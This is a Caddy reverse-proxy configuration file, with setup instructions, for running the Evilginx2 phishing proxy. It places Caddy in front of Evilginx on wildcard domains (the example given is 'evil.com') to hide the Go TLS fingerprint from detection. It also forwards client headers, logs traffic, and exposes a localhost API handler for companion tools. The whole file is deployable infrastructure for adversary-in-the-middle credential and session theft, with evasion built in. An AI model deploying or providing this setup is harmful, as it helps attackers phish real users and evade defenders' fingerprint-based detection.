# Caddy Reverse Proxy Configuration for Evilginx
# This masks the Go TLS fingerprint with Caddy's fingerprint
#
# Usage:
#   1. Install Caddy: https://caddyserver.com/docs/install
#   2. Update DOMAIN_NAME below with your actual domain
#   3. Run: caddy run --config Caddyfile
#   4. Start evilginx with: ./evilginx2 -p 8443 -bind 127.0.0.1
#
# Note: Caddy automatically obtains and renews SSL certificates!

# Global options
{
    # Email for Let's Encrypt notifications
    email admin@example.com
    
    # Enable debug logging (optional)
    # debug
    
    # ACME server (use staging for testing)
    # acme_ca https://acme-staging-v02.api.letsencrypt.org/directory
}

# Wildcard domain configuration
# Replace DOMAIN_NAME with your actual domain (e.g., evil.com)
*.DOMAIN_NAME, DOMAIN_NAME {
    # TLS configuration
    tls {
        protocols tls1.2 tls1.3
        ciphers TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256 TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256
    }
    
    # Reverse proxy to evilginx
    reverse_proxy https://127.0.0.1:8443 {
        # Don't verify evilginx's self-signed cert
        transport http {
            tls_insecure_skip_verify
        }
        
        # Preserve headers
        header_up Host {host}
        header_up X-Real-IP {remote_host}
        header_up X-Forwarded-For {remote_host}
        header_up X-Forwarded-Proto {scheme}
        header_up X-Forwarded-Host {host}
        
        # WebSocket support
        header_up Connection {>Connection}
        header_up Upgrade {>Upgrade}
    }
    
    # Logging
    log {
        output file /var/log/caddy/evilginx_access.log
        format json
    }
}

# Localhost handler for internal API communication (EvilFeed, etc.)
# This ensures internal services can reach Evilginx when it's on port 8443
:443 {
    # Self-signed cert for localhost
    tls internal
    
    # Only accept connections from localhost
    @localhost {
        remote_ip 127.0.0.1 ::1
    }
    
    # Forward internal API requests to Evilginx
    reverse_proxy @localhost https://127.0.0.1:8443 {
        transport http {
            tls_insecure_skip_verify
        }
    }
}
